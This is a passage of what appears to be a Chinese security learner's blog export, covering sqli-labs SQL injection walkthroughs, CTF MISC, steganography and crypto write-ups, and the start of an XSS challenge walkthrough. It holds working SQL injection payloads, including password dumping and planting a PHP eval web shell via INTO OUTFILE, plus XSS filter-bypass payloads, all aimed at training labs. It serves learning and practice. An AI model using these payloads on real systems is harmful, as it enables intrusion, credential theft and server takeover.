--+为注释符号 在url框中输入?id=2&#39;，发现 用--+将后面的字符注释掉，发现 正常显示，说明注入点是单引号。二、判断列数1http://127.0.0.1/sqli-labs-master/Less-1/?id=2' order by 4--+ 发现 一共三列，接下来就开始联合查询。1http://127.0.0.1/sqli-labs-master/Less-1/?id=0' union select 1,2,3--+ 这里将id等于一个数据库不存在的数，通过联合查询能看出我们输入的数据在哪里能够显示出来。在2，3的位置我们便可插入我们想用的语句了。 三、爆数据库1http://127.0.0.1/sqli-labs-master/Less-1/?id=0' union select 1,database(),3--+ 通过一个database()函数便可获知当前数据库。四、爆数据表 在此之前，我们要知道在MySQL中有information_schema这个库，该库存放了所有数据库的信息。information_schema.columns包含所有表的字段 table_schema 数据库名 table_name 表名 column_name 列名 information_schema.tables包含所有库的表名 table_schema 数据库名 table_name 表名 information_schema.schemata包含所有数据库的名 schema_name 数据库名 group_concat()函数功能：将group by产生的同一个分组中的值连接起来，返回一个字符串结果。 了解之后，才会更明白一些语句为何这样那样构造，接下来就开始查询数据表。1http://127.0.0.1/sqli-labs-master/Less-1/?id=0' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security'--+ 五、爆字段1http://127.0.0.1/sqli-labs-master/Less-1/?id=0' union select 1,(select group_concat(column_name) from information_schema.columns where table_name='users'),3 --+ 也可以1http://127.0.0.1/sqli-labs-master/Less-1/?id=0' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users' --+ 六、爆值1http://127.0.0.1/sqli-labs-master/Less-1/?id=0' union select 1,group_concat(username,0x3a,password),3 from users --+ 0x3a是:用来区分用户名和密码，不至于混淆。这样，用户名和密码就爆出来了。 sql-labs(二)1http://127.0.0.1/sqli-labs-master/Less-2/?id=1 order by 4--+ 无闭合符号 sql-labs(三)1http://127.0.0.1/sqli-labs-master/Less-3/?id=1') order by 4--+ 闭合符号为&#39;) sql-labs(四)1http://127.0.0.1/sqli-labs-master/Less-4/?id=1\") order by 4--+ 闭合符号为&quot;)其他步骤与第一关相同，这里就不阐述了。 接下来介绍第二种注入方式——报错注入报错注入原理报错注入是基于没有回显数据，只有报错语句的基础上才使用，例如sql-labs的第五关。这里即使id输入正确，也只会显示一个YOU are in……，但如果输入错误的语句时，会出现报错语句。那思路来了，我们可以故意构造报错语句，其中插入我们想要的语句，这样即使报错了，在语句中也含有我们想要的数据。网上有很多常见的报错注入语句，但是要理解原理，才能更好的使用这些语句。一、Duplicate entry报错报错注入的经典语句：12union select 1,count(*),concat(version(),floor(rand(0)*2))x from information_schema.columns group by x;–+version()可以替换为需要查询的信息。 简化语句：1union select 1,2,count(*) from information_schema.columns group by concat(version(),floor(rand(0)*2));–+ 在使用之前，我们要知道一些函数的作用 Count()计算总数Concat()连接字符串Floor()向下取整数Rand()产生0～1的随机数rand(0)序列是011011group by a 会根据a的规则对数据进行分组,而分组的时候,mysql会建立一个临时空表进行分组 这里看了很多大佬的博客，搞清楚了Duplicate entry报错的原理。union select 1,count(*),concat(version(),floor(rand(0)*2))x from information_schema.columns group by x;–+网上最常见的语句就是这个，但为何报错？？ 因为count()和floor(rand(0)2)的位置问题吗？？，其实不是的，这里也就不饶弯子了。其实报错的原因在与rand()函数在查询的时候会执行了一次，而插入的时候又会执行一次，group by 创建的临时表，第一次查询是0，,因为是空表所以插入这条,而插入的时候rand()又执行了一次，再执行一次因为表中已经有数据1，那么新添加的数据相加变成2，这里相当已经执行了三次（但其实是二次），所以011011就又排到0了，到了第三次执行rand()是值为0,因为表中不存在所以要插入新的数据,这次插入rand()再次执行,所以插入的又是1.而表中已经存在1了此时插入因为重复出现同一个key,就会出现报错 重复出现key。所以这也是为何floor(rand(0)*2)报错是有条件的，记录必须3条以上的原因这里我们觉得可以多去看看大佬的博客，他们写的真的非常详细，例如：MYSQL报错注入原理sql注入之报错注入MYSQL常见注入原理懂其原理，便可做题。 sql-labs(五) 首先判断出单引号闭合 利用经典语句 一、爆出数据库 1http://127.0.0.1/sqli-labs-master/Less-5/?id=2' union select 1,2,count(*) from information_schema.columns group by concat(database(),0x3a,floor(rand(0)*2));--+ 这里要注意的是报错语句会出现一个1，有时可能弄混淆，所以我们加上0x3a即:来隔开这个1。报错语句中又我们想要的信息，数据库名，接下来就爆表名。二、爆表名1http://127.0.0.1/sqli-labs-master/Less-5/?id=1' Union select 1,count(*),concat((select table_name from information_schema.tables where table_schema='security' limit 3,1),0x3a,floor(rand(0)*2))x from information_schema.columns group by x;--+ 爆出我们想要的表名三、爆字段值1http://127.0.0.1/sqli-labs-master/Less-5/?id=1' Union select 1,count(*),concat((select column_name from information_schema.columns where table_schema='security' and table_name='users' limit 1,1),0x26,floor(rand(0)*2))x from information_schema.columns group by x;--+ 1http://127.0.0.1/sqli-labs-master/Less-5/?id=1' Union select 1,count(*),concat((select column_name from information_schema.columns where table_schema='security' and table_name='users' limit 2,1),0x26,floor(rand(0)*2))x from information_schema.columns group by x;--+ 爆出了字段 四、爆值1http://127.0.0.1/sqli-labs-master/Less-5/?id=1' Union select 1,count(*),concat((select username from users limit 0,1),0x3a,floor(rand(0)*2))x from information_schema.columns group by x;--+ 这样就爆出用户名和密码了。 sql-labs(六)1http://127.0.0.1/sqli-labs-master/Less-6/?id=2\" union select 1,2,count(*) from information_schema.columns group by concat(database(),0x3a,floor(rand(0)*2));--+ 闭合符号为&quot;其它的步骤与sql-labs(五)相同，一步一步就可以爆出你想要的信息。 通过第七关学到了很多东西，菜刀的使用，而且学到一种注入方法。首先就先首先菜刀的方法，这个贼过瘾。。。之前总看大佬的博客中有一句话，我都不知道是什么意思今天终于搞清楚了一些，就先用第七关来练习一下。第一种方法-使用菜刀一、判断注入点但这时的报错语句已经统一规范成这样了，所以只有挨个试。试出来注入点为1&#39;))二、查列数一共三列三、构造一句话1http://127.0.0.1/sqli-labs-master/Less-7/?id=1')) union select 1,'&lt;?php @eval($_POST[\"mi\"])?&gt;',user() into outfile \"D://6.php\"--+ 注意这里将上传文件路径改为phpstudy的根目录，其他目录菜刀连接时会没有权限。将一句话文件上传到根目录后，开始动用菜刀，右键点击添加。地址填入你上传文件的地址后面的小框中填入一句话中构造的密码1&apos;&lt;?php @eval($_POST[&quot;mi&quot;])?&gt;&apos; 如：我构造的密码为mi点击连接这多过瘾，比慢慢爆出数据库过瘾多了，这直接进入服务器了。 第二种方法-手工注入只要判断出了闭合符号，其他按照那些固定的语句来吧。一、爆列这个就不演示了，一共就三列。二、爆表1http://127.0.0.1/sqli-labs-master/Less-7/?id=1')) union select 1,table_name,3 from information_schema.tables where table_schema='security' into outfile \"D://SQL//7.php\"--+ 去D盘的SQL目录中查看文件果然显示出来了三、爆字段1http://127.0.0.1/sqli-labs-master/Less-7/?id=1')) union select 1,(select group_concat(column_name) from information_schema.columns where table_name='users'),3 into outfile \"D://SQL//8.php\"--+ 四、爆值1http://127.0.0.1/sqli-labs-master/Less-7/?id=1')) union select 1,group_concat(username,0x3a,password),3 from users into outfile \"D://SQL//9.php\"--+ 会发现这些语句都是固定不变的，变的只是一些注入方式而已，所以懂得原理很重要。 sql-labs(八)与第七关不同的就是没有了报错提醒闭合符号为：&#39; 1http://127.0.0.1/sqli-labs-master/Less-8/?id=1' union select 1,'&lt;?php @eval($_POST[\"mi\"])?&gt;',user() into outfile \"D://8.php\"--+ 利用一句话和第七关相同。手工注入的话和第七关的方法相同，这里就不演示了 接下来就要学习一种新的注入方式，时间延时盲注，具体通过第九关来看。 sql-labs(九)在第九关中，无论我们怎么判断闭合符号，其显示的只是因此我们需要换一种方式来查看到底那个是闭合符号 1http://127.0.0.1/sqli-labs-master/Less-9/?id=1' and sleep(10)--+ 发现确实延迟了10秒，所以判断&#39;为闭合符号。再使用延时注入前，需要知道几个时间注入的函数 sleep() //延迟函数if(condition,true,false) //条件语句ascii() //转换成ascii码substr(“string”,strart,length) //取出字符串里的第几位开始，长度多少的字符 判断数据库名长度1?id=1' and if(length(database())&gt;1,sleep(4),0) --+ 爆出数据库名1?id=1'and if(ascii(substr(database(),1,1))&gt;M,sleep(5),0) --+ 原理很明显，提取数据库中的第一个字符，转化为ascll码，然后和M相比较，如果大于则睡5秒，否则不睡，这样就可以判断出第一个字符。通过改变substr函数后面的两个变量和M，我们就可以对数据库名进行猜解。 不建议手工注入，效率会很低，写一个python脚本跑一下就可以爆出来，目前自己还在学习python，等学完之后再写一个盲注的脚本，直接用别人的总感觉不太好。sql-labs(十)大致也是基于时间盲注的原理，只不过闭合符号不同罢了，就先学习到这里。","categories":[{"name":"web","slug":"web","permalink":"http://bealright.github.io/categories/web/"}],"tags":[{"name":"SQL注入","slug":"SQL注入","permalink":"http://bealright.github.io/tags/SQL注入/"}]},{"title":"ISCC2019-MISC总结","slug":"ISCC2019杂项题(MISC)总结","date":"2019-05-31T01:34:24.000Z","updated":"2019-06-07T07:53:06.097Z","comments":true,"path":"2019/05/31/ISCC2019杂项题(MISC)总结/","link":"","permalink":"http://bealright.github.io/2019/05/31/ISCC2019杂项题(MISC)总结/","excerpt":"","text":"ISCC2019刚刚结束，作为一个萌新我是真的菜，真心菜不过也会几道杂项题，就总结一下做题思路。 Aesop’s secret下载附件，打开一张gif图用PS打开,可以得到一张完整的图做到这里没思路了，就回去看题目提示。Aesop’s chest and key lie within .to find it（伊索的胸膛和钥匙都在里面。为了找到它 ）还是一脸懵，用winhex打开我们得到的完整图和gif的图看看会有什么出现。在gif图中发现下面感觉像base64，试试吧发现前面有一个单词，百度翻译（盐），一般这些都是有密钥的加密密文，取在线网站挨个解下，看看那个可以，密钥当然就是ISCC了。发现这段密文是AES加密，但结果还是base64解码，但还是解不开，那就用这个结果再来一次AES解密试试。flag用了两次AES加密，需要解两次才能得到。 Keyes’ secret下载附件，得到一开始无从下手，毫无思路，不过还好有谷歌百度，经过查询，发现应该是键盘密码。这里虽然字符多，奈何我视力好，发现了{}，按照常理，里面就应该是答案，试试吧。手动分离，还需要耐心，认真，否则很容易搞错。我就直接画了一张图，把QAZ,WSX。。。画在同一竖直方向，这样我们画的时候不至于乱。提交的格式一般是flag，这道题应该是不会在提交格式为难我们，应该就是flag{...},果然，得出flag. Welcome打开附件，繁体字，一开始以为繁体字加密？？？，但感觉不用，不可能是这样做的。毫无思路。。。用sublime打开看看。这里格式编码的问题，懒得改了。但可以发现这些空格是有规律的，有的地方是一个，有的地方是两个，这里把一个空格替换为0，两个空格替换为1。得出一段二进制 1011001100110110001100001011001110111101101001001010100110100001101000011010111110101011101000101010011000100001101001111010011010100010101111101 十六进制转换为ASCII即可得出flag转换网站 倒立屋这题LSB隐写，用神器Stegsolve打开选最低位，这里需要注意flag是倒过来的。。。 他们能在一起吗？做个题都能被。。。 唉不说了，做题吧给我们一张二维码，扫吧。扫出UEFTUyU3QjBLX0lfTDBWM19ZMHUlMjElN0Q=，base64解码这里在线网站有问题，应该是PASS{0K_I_L0V3_Y0u!}这肯定不会是答案，再回去研究二维码，用winhex打开，发现后面藏着一个txt文件,提取出来。小明要凉。。。得出flag 无法执行的exe不会修复。。。用winhex打开exe文件，观察观察。这个格式不就是base64转图片那个格式？？？，试试看，在线网站不行，用一下大佬的脚本，得出一张图片常见问题了，修改png格式即可了。 扫描得出IScC_2019 隐藏的信息 10126 062 0126 0163 0142 0103 0102 0153 0142 062 065 0154 0111 0121 0157 0113 0111 0105 0132 0163 0131 0127 0143 066 0111 0105 0154 0124 0121 060 0116 067 0124 0152 0102 0146 0115 0107 065 0154 0130 062 0116 0150 0142 0154 071 0172 0144 0104 0102 0167 0130 063 0153 0167 0144 0130 060 0113 八进制转为十六再转位ascll即可。这里得自己写一个脚本，网上在线工具不能用。 Misc-01下载附件，打开用winhex打开，参照Jpg图片文件包括2字节：FF D8，改下即可修好。但我却在winhex里看到了很多png图binwalk一下。。。无语，扫一下吧。第一张remake:最危险的地方就是最安全的地方+1其他也类似，不过第50张不同，他加的是10086.。。。再联系一下提示果然，base64一下 1flag&#123;15cC9012&#125; Misc-02Png图片文件包括8字节：89 50 4E 47 0D 0A 1A 0A，对照修改一下就可修复好一个二维码，扫一扫 中口由羊口中中大中中中井 当铺密码，解密一下1201902252228 这道题和前面那道类似，图片中还藏有东西，binwalk一下。一首让世界为你转身的歌。。。，我竟然还听出来了。那么这道题应该就是音频隐写了，利用神器MP3Stego密码即刚才破解的，破解出一个txt文件Unicode解码，即可得出flag. Score_List 下载附件，打开zip，发现有一个加密的exe文件 没什么思路，打开winhex看一下 这里还隐藏一个exe文件，binwalk分离出来 不知道用户名和密码。。。之前学长好像出过这种题，逆向的，试试吧。 发现了用户名和密码，结果也就得了出来了。 虽然做出了几道题，不过还是太菜，继续努力吧。","categories":[{"name":"MISC","slug":"MISC","permalink":"http://bealright.github.io/categories/MISC/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://bealright.github.io/tags/CTF/"}]},{"title":"CTF关于ZIP解题思路","slug":"CTF 关于ZIP解题过程","date":"2019-05-18T10:34:24.000Z","updated":"2019-06-07T07:53:34.804Z","comments":true,"path":"2019/05/18/CTF 关于ZIP解题过程/","link":"","permalink":"http://bealright.github.io/2019/05/18/CTF 关于ZIP解题过程/","excerpt":"","text":"CTF 关于ZIP解题1.伪加密类型打开之后是两张图片，一张未加密，一张已加密。利用WinHex打开然后在谷歌上找到大佬关于zip格式的介绍接下来进行对比，看是否属于伪加密通过对比，发现确实属于伪加密。所以将09改为00即可。 总结：从50 4B 01 02 开始数十位数便能查看是否是伪加密。 2.CRC32碰撞总结![在这里插入图片描述](https://github.com/bealright/bealright.github.io/blob/master/CTF%20zip/6.png?raw=true) 这个题是CRC32碰撞，首先有不会的就百度、谷歌。 通过查找发现需要CRC32碰撞的脚本和安装pathon。 一：安装CRC32 Tools 工具地址 二：安装pathon 因为要翻墙，去官网下载会特别慢，下载这个没有病毒，也可以用。 还有下载好之后，最好找一下这个版本的安装教程。安装3.7.2pathon的教程 配置好之后，打开cmd，进入你安装脚本的目录。打开下载好的压缩包：记录下1.2.3的CRC32值利用碰撞的语法： python crc32.py reverse “你的crc32密文”12345678910111213141516171819202122232425D:\\crc32&gt;python crc32.py reverse \"0X7F616EE3\"4 bytes: &#123;0xfc, 0xf3, 0x48, 0x10&#125;verification checksum: 0x7f616ee3 (OK)alternative: 06iBmA (OK)alternative: 2GAaYT (OK)alternative: 4BH2ir (OK)alternative: 8LCPd9 (OK)alternative: AGtKKP (OK)alternative: Dbvk8f (OK)alternative: ECiJJ3 (OK)alternative: Hp2U49 (OK)alternative: M9CXCK (OK)alternative: TrCiM1 (OK)alternative: WoYVfy (OK)alternative: _eO5jQ (OK)alternative: aHGrpU (OK)alternative: eLZsq6 (OK)alternative: k3y2Hh (OK)alternative: kCECM8 (OK)alternative: l61PcW (OK)alternative: m6paxN (OK)alternative: pymQwW (OK)alternative: xo4nzk (OK)alternative: you_ar (OK)&lt;!--破解1.flag--&gt; 12345678910111213141516171819202122D:\\crc32&gt;python crc32.py reverse \"0x127F1984\"4 bytes: &#123;0x0c, 0xa9, 0xe2, 0xfd&#125;verification checksum: 0x127f1984 (OK)alternative: 1IuEfu (OK)alternative: 7P3JWG (OK)alternative: 8_mKpP (OK)alternative: ATZP_9 (OK)alternative: K_XabT (OK)alternative: MZQ2Rr (OK)alternative: O76Mgs (OK)alternative: SxjLss (OK)alternative: TamrYX (OK)alternative: ZnrBeV (OK)alternative: bFsVOt (OK)alternative: cF2gTm (OK)alternative: e_the_ (OK)alternative: kPkXYQ (OK)alternative: lIlfsz (OK)alternative: n8DEGo (OK)alternative: oTvYX2 (OK)alternative: swYuHv (OK)&lt;!--破解2.flag--&gt; 1234567891011121314151617181920D:\\crc32&gt;python crc32.py reverse \"0x4FA83D8C\"4 bytes: &#123;0x7e, 0xfa, 0xeb, 0x0a&#125;verification checksum: 0x4fa83d8c (OK)alternative: 0KjFzu (OK)alternative: 3ka59e (OK)alternative: AwZr1l (OK)alternative: CK_lhq (OK)alternative: DRXRBZ (OK)alternative: LXN1Nr (OK)alternative: PFpQ6n (OK)alternative: RzuOos (OK)alternative: UcrqEX (OK)alternative: a5Dvga (OK)alternative: bXb8Iy (OK)alternative: cDlUSt (OK)alternative: lK2Ttc (OK)alternative: mKseoz (OK)alternative: nViZD2 (OK)alternative: ruFvTv (OK)&lt;!--破解3.flag--&gt; 接下来，找到有意义或连贯的的英语词语。通过查找发现有几个有意义的词语。12e_the_you_ar 一开始以为答案就应该是：flag{you_are_the_}，但提交还是错误。通过查找，发现漏了一种可能，就是特殊字符。CRC32和MD5加密都是不可逆的，也就是说加密之后是不能反过来看我之前的内容。所以有的大佬就将常见的词（例如 A,B,C。。。）写成了一个脚本,通过一个一个对比来破解出之前的密文。 打开我们下载的CRC32脚本。上面便是大佬脚本中的常见词，接下来我们自己添加一些特殊字符。可以看到我自己添加了；/，！等这些特殊符号。（还有一点不要在最后面加特殊字符，会有问题，最好在0前面加）。 再次破解1.2.3.flag发现3中出现有意义的词语。123456789101112131415161718192021222324252627282930313233D:\\crc32&gt;python crc32.py reverse \"0x4FA83D8C\"4 bytes: &#123;0x7e, 0xfa, 0xeb, 0x0a&#125;verification checksum: 0x4fa83d8c (OK)alternative: ,hEjj1 (OK)alternative: .83Y7h (OK)alternative: 0KjFzu (OK)alternative: 3ka59e (OK)alternative: 3w.i8q (OK)alternative: 6R,IKG (OK)alternative: ;,ZkXE (OK)alternative: ;awV5M (OK)alternative: AwZr1l (OK)alternative: CK_lhq (OK)alternative: DRXRBZ (OK)alternative: H,oAJA (OK)alternative: I,.pQX (OK)alternative: I0a,PL (OK)alternative: LXN1Nr (OK)alternative: PFpQ6n (OK)alternative: QgopD; (OK)alternative: RzuOos (OK)alternative: UcrqEX (OK)alternative: Zl,pbO (OK)alternative: a5Dvga (OK)alternative: bXb8Iy (OK)alternative: best!! (OK)alternative: cDlUSt (OK)alternative: f,CHMJ (OK)alternative: lK2Ttc (OK)alternative: mKseoz (OK)alternative: nViZD2 (OK)alternative: ruFvTv (OK)alternative: z.2t4B (OK)在这里插入代码片 best!!所以把之前的拼凑起来。1flag&#123;you_are_the_best!!&#125; 所以这样便把CRC32碰撞的题给做出了咯。 2：GIF图片修复题目已经提示这是一张GIF猜想一下flag肯定会隐藏在95KB里面（毕竟几个字母都占几KB)点击图片，但无法打开。用winhex打开。题中明明说这是一张GIF，所以应该就是修复GIF图片，查百度、谷歌大法。 地址按照上面的操作，并且将文件头改为GIF图片的格式。因为是个动态图，所以下面就得自己想办法让它显示出来。因为我下载了PS软件，所以用这个看会很方便。欧克，这道题已解开。","categories":[{"name":"MISC","slug":"MISC","permalink":"http://bealright.github.io/categories/MISC/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://bealright.github.io/tags/CTF/"}]},{"title":"CTF隐写总结","slug":"CTF隐写总结","date":"2019-05-09T08:34:24.000Z","updated":"2019-06-07T07:53:30.305Z","comments":true,"path":"2019/05/09/CTF隐写总结/","link":"","permalink":"http://bealright.github.io/2019/05/09/CTF隐写总结/","excerpt":"","text":"CTF隐写总结一：LSB隐写 LSB概念 LSB，英文 least significant bit，中文义最低有效位。 对于一个给定的数据串,其最低有效位就是拥有最小单位数值的那一位. 关于LSB隐写的详细介绍 LSB详细介绍关于LSB隐写的详细算法 LSB详细算法关于LSB隐写的总结博客 LSB隐写总结隐写技巧：PNG文件中的LSB隐写 打开以后是一张这样的图片题目已经提醒这道题属于LSB隐写，那么就发动查百度、谷歌大法吧。经过查找，会发现需要用这个神器来处理这种题目。但打开这个软件需要有java，所以还得下载，最好也配置一下环境变量。java详细配置配置好之后那，用java打开Stegsolve.jar将图片打开后，通过下方的按钮切换不同的通道。结果你就会发现一个很不一样的东西。红色通道前六张都没有太大的变化，但是问题出现在第七张。可以明显的看到，右上方隐藏了一些东西。然后，通过观察，发现，green通道和blue通道也是如此。那接下来就进行数据提取因为发现三种颜色都是在0通道时发生了不同，所以勾选三个颜色的最低位。结果flag就出来咯！！题是很简单，但关键是要理解为何如此做，做题不难，难在理解为何这样做。大牛的博客——介绍为何勾选最低位的0这道题的解法与上一道也是一样的。 二：双图打开后是两张图片，而且两张图片一样。？？？这时就该敏感了，因为大多两张图片相同的题型都是盲水印，另外一种就是双图，但题目已经提示了是双图，所以就安装双图的做法去解决这道题。（两张图片大小不一样，第二张一定隐藏了一些信息）用Stegsolve打开第一张图再使用Image combiner( 图像结合),与第二张结合，看看会发生什么变化。（我觉得这里就是两张图片进行对比，前面可以看到第二张图片比第一张图片大了30多KB，所以那多出的30多KB的内容会出现在结合后的图片中）结果在变换通道中找到一个二维码，扫吧。。。结果什么也扫不出了。。。将这张图片保存下来，再用Stegsolve打开，变换通道，可以看到三张不同的二维码。下面就是扫码工作了，( 推荐支付宝扫码，微信我半天都没扫出来，还以为错了。。。)扫过之后，有提示，有密文，解密就能得出flag了 三：盲水印 盲水印介绍：盲水印隐蔽性强，给水印数据进行编码过后不易被破解出来，而且不会破坏图片美观，且又能很好的保护图片版权。 详细介绍盲水印的一些博客：介绍盲水印盲水印原理打开之后是两张相同的图片发动查百度、谷歌大法，破解盲水印，需要脚本或工具。 BlindWaterMark脚本但要注意这个是py2的脚本，如果下载的是py3就会出现语法错误。（这里卡了我一晚上） 修改方法是：py3自带了一个脚本2to3.py，可以将python2的程序自动转为python3的形式。但是不熟悉python语法，到后面还是会出现错误。（所以最好先不要用这个脚本去解题，待熟悉python语言后再用，否则就算知道哪里错了，也不会改）大牛的博客介绍如何修改 这里介绍另一个脚本blind-watermark这个脚本可以选择下载py3的脚本，这样就可以减少一些修改麻烦。 操作语法python decode.py –original ori.png –image res.png –result extract.png注意： 两张图片分辨率要相同，否则会报错。 在下载脚本的目录里打开cmd，输入命令。出现一个图片，但是打开却。。。黑黑的。。。啥也看不见。。。既然脚本这条路走不通，那只好偷懒了，下载工具吧。数字盲水印&amp;隐形水印制作工具WaterMarkH V1.2下载地址两张图片相同，一定是图片大的那一张隐藏有信息，所以试试第二张。flag出来了(感悟：有时如果是脚本对图片进行盲水印的话，那只能用脚本才能解开。但如果用工具添加水印的话，也只能用工具解开) 四：画图zip里面放了一张图片打开以后是一个很可爱的女孩子用Winhex打开图片，发现有很大的不同，上面全是乱码，但是到了下面全是数字，估计藏有猫腻。ctrl+A全选，然后再将这一堆数字给复制出来再用Notepad++打开提示的是画图，在坐标系里画图需要坐标，现在给的一堆数字是十六进制的数，在Notepad++中转换一下，看是否能出现坐标。结果确实出现了坐标那下面就实现画图吧，怎么画。。。我还是去找百度、谷歌吧 经过查找需要这个画图工具但是得注意一点的是，坐标必须满足这个工具的格式。必须改为这种格式的坐标改成这样很简单，只需要点击替换，把（ 和）都替换掉，把逗号改为空格就了。然后将改好的文档保存，放入gnuplot的bin目录里，打开bin目录gnuplot.exe，输入命令（我理解的是要执行的文件必须和这应用程序放在同一个目录，否则无法执行，会报错). 输入命令 plot “文件名” 用支付宝一扫就🆗了","categories":[{"name":"MISC","slug":"MISC","permalink":"http://bealright.github.io/categories/MISC/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://bealright.github.io/tags/CTF/"}]},{"title":"CTF密码学总结","slug":"CTF Crypto(密码学)总结","date":"2019-05-08T12:34:24.000Z","updated":"2019-06-07T07:53:39.720Z","comments":true,"path":"2019/05/08/CTF Crypto(密码学)总结/","link":"","permalink":"http://bealright.github.io/2019/05/08/CTF Crypto(密码学)总结/","excerpt":"","text":"最近接触了一些密码学的题，感觉特别有意思，写下博客来记录一下，以免忘记 一：哈夫曼树.png?raw=true)哈夫曼树（也称为最优二叉树），虽然（目前）没学，但是百度、谷歌大法无敌。查查原理，再去做题。经过一番查找，懂了原理，就总结了一下简单说：叶子结点：权值a : 4d ：9g : 1f : 5l : 10 : 75 : 9{ : 1} : 1 画图时最上面的是根，而最优二叉树的规则则是需要权值大的尽量放在上面例如：叶子结点：权值a 7b 5c 2d 4搞懂了这个，但是这个题中还给了我们一堆数111000111000001010010010101100110110101111101110101011110111111100001000110010110101111001101110001000110 这些代表上面意思那？？经过查找发现发现原来这是哈夫曼树编码详细的介绍 那我们先来完成第一步，画树。一开始没画对，画了三四遍，才算画出来，不过不太熟练，还得练。画的时候最好从下到上画，先把权值小的画出来，一步一步往上画。 既然画出来了，那就用哈夫曼树编码来把每个数字或字符用编码的方式表示出来。通过画也发现在同一分支中，哪个权值大，那么哪个就是1。例如:17下的d（权值为9）和权值为8的相比，那么d的路径就表示为1. 接下来就是安装这样的方法把那么字符都用编码表示出来 f:110 l:00111 a:000 g:00101 ..... 下面都这样表示接下来就开始进行比对111000111000001010010010101100110110101111101110101011110111111100001000110010110101111001101110001000110 一般CTF题的提交格式都是flag{……}所以我们这里就首先看第一个是不是f110 恰好对应 f00111 恰好对应 l000 恰好对应 a00101 恰好对应 g前面对应了几乎就没啥子问题了，但是还有一点比较坑的有的因为权值相等，需要在转换的时候看是否应该换一下位置。例如：{ 和 } 权值相等，在转化时看是否需要进行换位置。 我们再观察我们上面画的图，其中5和d的权值也相同，所以如果提交的答案不对的话，就尝试一下换下位置。这道题是西湖论剑的题，下面有进入决赛大佬的WP。关于西湖题的wp 二：传统知识+古典密码在实验吧上做了一道很有意思的题目。首先就想了解一下传统知识吧在百度上找到六十甲子顺序表，就先对应着把数字写出来。 辛卯28，癸巳30，丙戌23，辛未8，庚辰17，癸酉10，己卯16，癸巳30。“+甲子60”（这里有一个疑问，按图来说甲子不应该是1吗？？？ 为什么会+60。。。其实这里面还是对传统文化的不熟悉，查查百度，如果还晕的话，记住就行了）处理完之后的数88,90,83,68,77,70,76,90转换一下ASCII码看看XZSDMFLZ没思路了。。。看看题目咋提示的古典密码古典密码一般涉及的就是替换或移位就先用栅栏密码试试了一共8位： 可以分为2个字一组，也可以是4个字一组，都试试。先用2个字为一组的，解出来栅栏密码在线解密XMZFSLDZ再用凯撒密码解密凯撒在线解密发现有一串字母好像是有点意义的，拿出来试试。shuangyu改为大写，因为我们输入的就是大写。SHUANGYUCTF{SHUANGYU}提交结果正确，就不用再往下试了。这个题有很多好玩的地方，需要了解传统的甲子表，需要了解栅栏密码，要了解凯撒密码。wiki大佬关于密码学的WP各种加密方式 三、滴答滴答下载起来，打开后是这样的看过柯南的都应该知道这个是摩斯密码，所以拿去解一下密，看看会出现什么？摩斯密码解密后面的一堆C和D，但是前面我看到了MORSE（摩斯）后面的应该有意义，百度翻译看一下吧培根？？？，查一下。了解培根加密之后，我们就知道那一堆C和D有啥用处了首先，我们先把C转化为A，D转化为B。转化完成后，进行解密培根加密解密结果出来了，百度翻译一下。当时在这里卡了，猛的一下不知道啥意思。。。还是太菜。经过学长提醒。。。是栅栏密码，猛的一下明白了，原来ZGIAHYANAUOZNXWI这个就是密文，而且也提示了四道栅栏，所以每组四个字。章鱼小丸子至于提交就有点坑了，不用flag{}格式，直接提交就行。不过这道题确实很有意思，了解了摩斯密码，培根密码，栅栏密码。不过还得练，还是太菜，有的时候就是想不到。。。","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://bealright.github.io/tags/CTF/"}]},{"title":"XSS学习-XSS挑战之旅(一)","slug":"web安全—XSS攻击(二)","date":"2019-04-28T12:20:32.000Z","updated":"2019-07-24T00:42:02.501Z","comments":true,"path":"2019/04/28/web安全—XSS攻击(二)/","link":"","permalink":"http://bealright.github.io/2019/04/28/web安全—XSS攻击(二)/","excerpt":"","text":"练习了DVWA靶场中的XSS了解了一些原理和攻击方式，接下来就用在线XSS平台开始实战一番。 在线XSS平台地址 第一关用最常用的攻击语句试试。 1&lt;script&gt;alert(/hacker/)&lt;/script&gt; 第二关就先把这个最简单的攻击语句放上去看看 1&lt;script&gt;alert(/hacker/)&lt;/script&gt; 没有出现弹窗，看下页面源代码。12&lt;input name=keyword value=\"&lt;script&gt;alert(/hacker/)&lt;/script&gt;\"&gt;&lt;input type=submit name=submit value=\"搜索\"/&gt; 观察代码，要想我们的语句起作用，就需要把前面的&lt;input&gt;标签给闭合掉。那就输入这样的语句：payload：1\"&gt;&lt;script&gt;alert(/hacker/)&lt;/script&gt; 第三关还是那个套路，放上最常用的语句试试没有成功，看看页面源代码 12&lt;input name=keyword value='&amp;lt;script&amp;gt;alert(/hacker/)&amp;lt;/script&amp;gt;'&gt;&lt;input type=submit name=submit value=搜索 /&gt; 发现输入的&lt;和&gt;被转义了既然过滤了&lt;和&gt;，那就换一种攻击方式，用onclick 事件，onclick 事件会在元素被点击时发生。onclick 事件直接包含在&lt;&gt;内，并且可以被执行。再观察页面源代码，是单引号，那就在前面加&#39;把value给闭合掉。payload：1'onclick='javascript:alert(/hacker/)' 输入之后，再点击一下输入框 第四关先拿一个攻击语句测试下，再看看页面源代码。 12&lt;input name=keyword value=\"scriptalert(/hacker/)/script\"&gt;&lt;input type=submit name=submit value=搜索 /&gt; 观察到&lt;和&gt;直接被过滤掉了那就用onclick 事件，这里是双引号，那就在前面输入&quot;，把value给闭合掉。payload：1\"onclick=\"javascript:alert(/hacker/)\" 第五关还是那个套路，先输入常用的看看,没有弹窗，看看页面源代码。 12&lt;input name=keyword value=\"\"o_nclick=\"javascript:alert(/xss/)\"\"&gt;&lt;input type=submit name=submit value=搜索 /&gt; 发现on中多了一个下划线，所以过滤了onclick事件，试试script,再看页面源代码。12&lt;input name=keyword value=\"\"&gt;&lt;scr_ipt&gt;alert(/hacker/)&lt;/script&gt;\"&gt;&lt;input type=submit name=submit value=搜索 /&gt; 果然，script也同样被过滤了。那就用&lt;a&gt;标签构造攻击语句试试。payload：1\"&gt;&lt;a href=\"javascript:alert(/xss/)\"&gt;hacker&lt;/a&gt; 也可以再后面加上//注释掉后面的&quot;/，以免对前面的语句产生影响。 第六关输入我们刚才用的语句，看页面源代码。 12&lt;input name=keyword 